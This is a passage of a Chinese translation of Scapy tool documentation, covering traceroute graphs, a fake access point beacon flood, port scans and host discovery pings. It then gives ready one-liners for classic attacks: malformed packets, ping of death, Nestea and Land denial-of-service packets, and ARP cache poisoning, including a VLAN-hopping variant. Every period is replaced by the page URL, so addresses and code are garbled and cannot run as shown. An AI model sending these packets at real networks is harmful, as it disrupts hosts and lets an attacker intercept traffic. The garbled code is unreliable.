13 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 206https://wizardforcel.gitbooks.io/scapy-docs/content/24https://wizardforcel.gitbooks.io/scapy-docs/content/238https://wizardforcel.gitbooks.io/scapy-docs/content/166 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/29https://wizardforcel.gitbooks.io/scapy-docs/content/45 66https://wizardforcel.gitbooks.io/scapy-docs/content/218https://wizardforcel.gitbooks.io/scapy-docs/content/82https://wizardforcel.gitbooks.io/scapy-docs/content/234
14 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/74https://wizardforcel.gitbooks.io/scapy-docs/content/30 64https://wizardforcel.gitbooks.io/scapy-docs/content/125https://wizardforcel.gitbooks.io/scapy-docs/content/31https://wizardforcel.gitbooks.io/scapy-docs/content/214 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
15 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/120https://wizardforcel.gitbooks.io/scapy-docs/content/151 64https://wizardforcel.gitbooks.io/scapy-docs/content/124https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/109 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
16 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/72 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
17 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/72 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
18 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/72 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
19 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/72 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA
20 195https://wizardforcel.gitbooks.io/scapy-docs/content/101https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/25 SA 212https://wizardforcel.gitbooks.io/scapy-docs/content/23https://wizardforcel.gitbooks.io/scapy-docs/content/37https://wizardforcel.gitbooks.io/scapy-docs/content/13 SA 216https://wizardforcel.gitbooks.io/scapy-docs/content/109https://wizardforcel.gitbooks.io/scapy-docs/content/118https://wizardforcel.gitbooks.io/scapy-docs/content/72 SA 64https://wizardforcel.gitbooks.io/scapy-docs/content/241https://wizardforcel.gitbooks.io/scapy-docs/content/242https://wizardforcel.gitbooks.io/scapy-docs/content/243 SA 66https://wizardforcel.gitbooks.io/scapy-docs/content/94https://wizardforcel.gitbooks.io/scapy-docs/content/229https://wizardforcel.gitbooks.io/scapy-docs/content/254 SA</code></pre> 
<p>Traceroute返回对象有一个非常实用的功能：他们会将得到的所有路线做成一个有向图，并用AS组织路线。你需要安装graphviz。在默认情况下会使用ImageMagick显示图形。</p> 
<pre><code>&gt;&gt;&gt; res,unans = traceroute(["wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/microsofthttps://wizardforcel.gitbooks.io/scapy-docs/content/com","wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/ciscohttps://wizardforcel.gitbooks.io/scapy-docs/content/com","wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/yahoohttps://wizardforcel.gitbooks.io/scapy-docs/content/com","wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/wanadoohttps://wizardforcel.gitbooks.io/scapy-docs/content/fr","wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/pacsechttps://wizardforcel.gitbooks.io/scapy-docs/content/com"],dport=[80,443],maxttl=20,retry=-2)
Received 190 packets, got 190 answers, remaining 10 packets
193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/122https://wizardforcel.gitbooks.io/scapy-docs/content/103:443 193https://wizardforcel.gitbooks.io/scapy-docs/content/252https://wizardforcel.gitbooks.io/scapy-docs/content/122https://wizardforcel.gitbooks.io/scapy-docs/content/103:80 198https://wizardforcel.gitbooks.io/scapy-docs/content/133https://wizardforcel.gitbooks.io/scapy-docs/content/219https://wizardforcel.gitbooks.io/scapy-docs/content/25:443 198https://wizardforcel.gitbooks.io/scapy-docs/content/133https://wizardforcel.gitbooks.io/scapy-docs/content/219https://wizardforcel.gitbooks.io/scapy-docs/content/25:80 207https://wizardforcel.gitbooks.io/scapy-docs/content/46https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 192https://wizardforcel.gitbooks.io/scapy-docs/content/16https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
2 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 82https://wizardforcel.gitbooks.io/scapy-docs/content/251https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
3 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/254 213https://wizardforcel.gitbooks.io/scapy-docs/content/22https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
[https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/]
&gt;&gt;&gt; reshttps://wizardforcel.gitbooks.io/scapy-docs/content/graph() # piped to ImageMagick's display programhttps://wizardforcel.gitbooks.io/scapy-docs/content/ Image belowhttps://wizardforcel.gitbooks.io/scapy-docs/content/
&gt;&gt;&gt; reshttps://wizardforcel.gitbooks.io/scapy-docs/content/graph(type="ps",target="| lp") # piped to postscript printer
&gt;&gt;&gt; reshttps://wizardforcel.gitbooks.io/scapy-docs/content/graph(target="&gt; /tmp/graphhttps://wizardforcel.gitbooks.io/scapy-docs/content/svg") # saved to file</code></pre> 
<p> </p> 
<p>如果你安装了VPython，你就可以用3D来表示traceroute。右边的按钮是旋转图案，中间的按钮是放大缩小，左边的按钮是移动图案。如果你单击一个球，它的IP地址就会出现/消失。如果你按住Ctrl单击一个球，就会扫描21,22,23,25,80和443端口，并显示结果：</p> 
<pre><code>&gt;&gt;&gt; reshttps://wizardforcel.gitbooks.io/scapy-docs/content/trace3D()</code></pre> 
<p> </p> 
<p> </p> 
<p>frame injection的前提是你的无线网卡和驱动得正确配置好。</p> 
<pre><code>$ ifconfig wlan0 up
$ iwpriv wlan0 hostapd 1
$ ifconfig wlan0ap up</code></pre> 
<p>你可以造一个FakeAP：</p> 
<pre><code>&gt;&gt;&gt; sendp(Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/
Dot11Beacon(cap="ESS")/
Dot11Elt(ID="SSID",info=RandString(RandNum(1,50)))/
Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/
Dot11Elt(ID="DSset",info="\x03")/
Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"),iface="wlan0ap",loop=1)</code></pre> 
<p>使用Scapy强大的数据包功能，我们可以快速地复制经典的TCP扫描。例如，模拟ACK Scan将会发送以下字符串：</p> 
<pre><code>&gt;&gt;&gt; ans,unans = sr(IP(dst="wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/slashdothttps://wizardforcel.gitbooks.io/scapy-docs/content/org")/TCP(dport=[80,666],flags="A"))</code></pre> 
<p>我们可以在有应答的数据包中发现未过滤的端口：</p> 
<pre><code>&gt;&gt;&gt; for s,r in ans:
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ if s[TCP]https://wizardforcel.gitbooks.io/scapy-docs/content/dport == r[TCP]https://wizardforcel.gitbooks.io/scapy-docs/content/sport:
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ print str(s[TCP]https://wizardforcel.gitbooks.io/scapy-docs/content/dport) + " is unfiltered"</code></pre> 
<p>同样的，可以在无应答的数据包中发现过滤的端口：</p> 
<pre><code>&gt;&gt;&gt; for s in unans:
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ print str(s[TCP]https://wizardforcel.gitbooks.io/scapy-docs/content/dport) + " is filtered"</code></pre> 
<p>可以使用以下的命令来启动Xmas Scan：</p> 
<pre><code>&gt;&gt;&gt; ans,unans = sr(IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1")/TCP(dport=666,flags="FPU") )</code></pre> 
<p>有RST响应则意味着目标主机的对应端口是关闭的。</p> 
<p>较低级的IP Scan可以用来枚举支持的协议：</p> 
<pre><code>&gt;&gt;&gt; ans,unans=sr(IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1",proto=(0,255))/"SCAPY",retry=2)</code></pre> 
<p>在本地以太网络上最快速地发现主机的方法莫过于ARP Ping了：</p> 
<pre><code>&gt;&gt;&gt; ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/0/24"),timeout=2)</code></pre> 
<p>用以下命令可以来审查应答：</p> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summary(lambda (s,r): rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%Etherhttps://wizardforcel.gitbooks.io/scapy-docs/content/src% %ARPhttps://wizardforcel.gitbooks.io/scapy-docs/content/psrc%") )</code></pre> 
<p>Scapy还包含内建函数<code>arping()</code>,该函数实现的功能和以上的两个命令类似：</p> 
<pre><code>&gt;&gt;&gt; arping("192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/*")</code></pre> 
<p>可以用以下的命令来模拟经典的ICMP Ping：</p> 
<pre><code>&gt;&gt;&gt; ans,unans=sr(IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1-254")/ICMP())</code></pre> 
<p>用以下的命令可以收集存活主机的信息：</p> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summary(lambda (s,r): rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/src% is alive") )</code></pre> 
<p>如果ICMP　echo请求被禁止了，我们依旧可以用不同的TCP Pings，就像下面的TCP SYN Ping:</p> 
<pre><code>&gt;&gt;&gt; ans,unans=sr( IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/*")/TCP(dport=80,flags="S") )</code></pre> 
<p>对我们的刺探有任何响应就意味着为一台存活主机，可以用以下的命令收集结果：</p> 
<pre><code class="language-html"> </code></pre> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summary( lambda(s,r) : rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/src% is alive") )</code></pre> 
<p>如果其他的都失败了，还可以使用UDP Ping，它可以让存活主机产生ICMP Port unreachable错误。你可以挑选任何极有可能关闭的端口，就像端口0：</p> 
<pre><code>&gt;&gt;&gt; ans,unans=sr( IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/1-10")/UDP(dport=0) )</code></pre> 
<p>同样的，使用以下命令收集结果：</p> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summary( lambda(s,r) : rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/src% is alive") )</code></pre> 
<p>Malformed packets:</p> 
<pre><code>&gt;&gt;&gt; send(IP(dst="10https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/5", ihl=2, version=3)/ICMP())</code></pre> 
<p>Ping of death (Muuahahah):</p> 
<pre><code>&gt;&gt;&gt; send( fragment(IP(dst="10https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/5")/ICMP()/("X"*60000)) )</code></pre> 
<p>Nestea attack:</p> 
<pre><code>&gt;&gt;&gt; send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
&gt;&gt;&gt; send(IP(dst=target, id=42, frag=48)/("X"*116))
&gt;&gt;&gt; send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))</code></pre> 
<p>Land attack (designed for Microsoft Windows):</p> 
<pre><code>&gt;&gt;&gt; send(IP(src=target,dst=target)/TCP(sport=135,dport=135))</code></pre> 
<p>这种攻击可以通过VLAN跳跃攻击投毒ARP缓存，使得其他客户端无法加入真正的网关地址。</p> 
<p>经典的ARP缓存投毒：　　　　</p> 
<pre><code>&gt;&gt;&gt; send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
inter=RandNum(10,40), loop=1 )</code></pre> 
<p>使用double 802https://wizardforcel.gitbooks.io/scapy-docs/content/1q封装进行ARP缓存投毒：</p> 
<pre><code>&gt;&gt;&gt; send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
/ARP(op="who-has", psrc=gateway, pdst=client),
inter=RandNum(10,40), loop=1 )</code></pre> 
<p>发送一个TCP SYN到每一个端口上。等待一个SYN-ACK或者是RST或者是一个ICMP错误：</p> 
<pre><code>&gt;&gt;&gt; res,unans = sr( IP(dst="target")
/TCP(flags="S", dport=(1,1024)) )</code></pre> 
<p>将开放的端口结果可视化：</p> 
<pre><code>&gt;&gt;&gt; reshttps://wizardforcel.gitbooks.io/scapy-docs/content/nsummary( lfilter=lambda (s,r): (rhttps://wizardforcel.gitbooks.io/scapy-docs/content/haslayer(TCP) and (rhttps://wizardforcel.gitbooks.io/scapy-docs/content/getlayer(TCP)https://wizardforcel.gitbooks.io/scapy-docs/content/flags &amp; 2)) )</code></pre> 
<p>我们试图通过发送ISAKMP Security Association proposals来确定VPN集中器，并接收应答：</p> 
<pre><code>&gt;&gt;&gt; res,unans = sr( IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/*")/UDP()
/ISAKMP(init_cookie=RandString(8), exch_type="identity prothttps://wizardforcel.gitbooks.io/scapy-docs/content/")
/ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal())
)</code></pre> 
<p>可视化结果列表：</p> 
<pre><code>&gt;&gt;&gt; reshttps://wizardforcel.gitbooks.io/scapy-docs/content/nsummary(prn=lambda (s,r): rhttps://wizardforcel.gitbooks.io/scapy-docs/content/src, lfilter=lambda (s,r): rhttps://wizardforcel.gitbooks.io/scapy-docs/content/haslayer(ISAKMP) )</code></pre> 
<h4 id="articleHeader5">TCP SYN traceroute</h4> 
<pre><code>
&gt;&gt;&gt; ans,unans=sr(IP(dst="4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1",ttl=(1,10))/TCP(dport=53,flags="S"))</code></pre> 
<p>结果会是：</p> 
<pre><code>&gt;&gt;&gt; anshttps://wizardforcel.gitbooks.io/scapy-docs/content/summary( lambda(s,r) : rhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/src%\t{ICMP:%ICMPhttps://wizardforcel.gitbooks.io/scapy-docs/content/type%}\t{TCP:%TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/flags%}"))
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1 time-exceeded
68https://wizardforcel.gitbooks.io/scapy-docs/content/86https://wizardforcel.gitbooks.io/scapy-docs/content/90https://wizardforcel.gitbooks.io/scapy-docs/content/162 time-exceeded
4https://wizardforcel.gitbooks.io/scapy-docs/content/79https://wizardforcel.gitbooks.io/scapy-docs/content/43https://wizardforcel.gitbooks.io/scapy-docs/content/134 time-exceeded
4https://wizardforcel.gitbooks.io/scapy-docs/content/79https://wizardforcel.gitbooks.io/scapy-docs/content/43https://wizardforcel.gitbooks.io/scapy-docs/content/133 time-exceeded
4https://wizardforcel.gitbooks.io/scapy-docs/content/68https://wizardforcel.gitbooks.io/scapy-docs/content/18https://wizardforcel.gitbooks.io/scapy-docs/content/126 time-exceeded
4https://wizardforcel.gitbooks.io/scapy-docs/content/68https://wizardforcel.gitbooks.io/scapy-docs/content/123https://wizardforcel.gitbooks.io/scapy-docs/content/38 time-exceeded
4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1 SA</code></pre> 
<h4 id="articleHeader6">UDP traceroute</h4> 
<p>相比较TCP来说， traceroute一个UDP应用程序是不可靠的，因为ta没有握手的过程。我们需要给一个应用性的有效载荷（DNS，ISAKMP，NTP等）来得到一个应答：</p> 
<pre><code>&gt;&gt;&gt; res,unans = sr(IP(dst="target", ttl=(1,20))/UDP()/DNS(qd=DNSQR(qname="testhttps://wizardforcel.gitbooks.io/scapy-docs/content/com"))</code></pre> 
<p>我们可以想象得到一个路由器列表的结果：</p> 
<pre><code>&gt;&gt;&gt; reshttps://wizardforcel.gitbooks.io/scapy-docs/content/make_table(lambda (s,r): (shttps://wizardforcel.gitbooks.io/scapy-docs/content/dst, shttps://wizardforcel.gitbooks.io/scapy-docs/content/ttl, rhttps://wizardforcel.gitbooks.io/scapy-docs/content/src))</code></pre> 
<h4 id="articleHeader7">DNS traceroute</h4> 
<p>我们可以在<code>traceroute()</code>函数中设置<code>l4</code>参数为一个完整的数据包，来实现DNS traceroute：</p> 
<pre><code>&gt;&gt;&gt; ans,unans=traceroute("4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1",l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname="thesprawlhttps://wizardforcel.gitbooks.io/scapy-docs/content/org")))
Begin emission:
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/*https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/******https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/******https://wizardforcel.gitbooks.io/scapy-docs/content/***https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/****Finished to send 30 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
*****https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/***https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
Received 75 packets, got 28 answers, remaining 2 packets
4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1:udp53
1 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1 11
4 68https://wizardforcel.gitbooks.io/scapy-docs/content/86https://wizardforcel.gitbooks.io/scapy-docs/content/90https://wizardforcel.gitbooks.io/scapy-docs/content/162 11
5 4https://wizardforcel.gitbooks.io/scapy-docs/content/79https://wizardforcel.gitbooks.io/scapy-docs/content/43https://wizardforcel.gitbooks.io/scapy-docs/content/134 11
6 4https://wizardforcel.gitbooks.io/scapy-docs/content/79https://wizardforcel.gitbooks.io/scapy-docs/content/43https://wizardforcel.gitbooks.io/scapy-docs/content/133 11
7 4https://wizardforcel.gitbooks.io/scapy-docs/content/68https://wizardforcel.gitbooks.io/scapy-docs/content/18https://wizardforcel.gitbooks.io/scapy-docs/content/62 11
8 4https://wizardforcel.gitbooks.io/scapy-docs/content/68https://wizardforcel.gitbooks.io/scapy-docs/content/123https://wizardforcel.gitbooks.io/scapy-docs/content/6 11
9 4https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/1
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/</code></pre> 
<pre><code>&gt;&gt;&gt; sr1(IP(dst="172https://wizardforcel.gitbooks.io/scapy-docs/content/16https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/232")/ICMP())
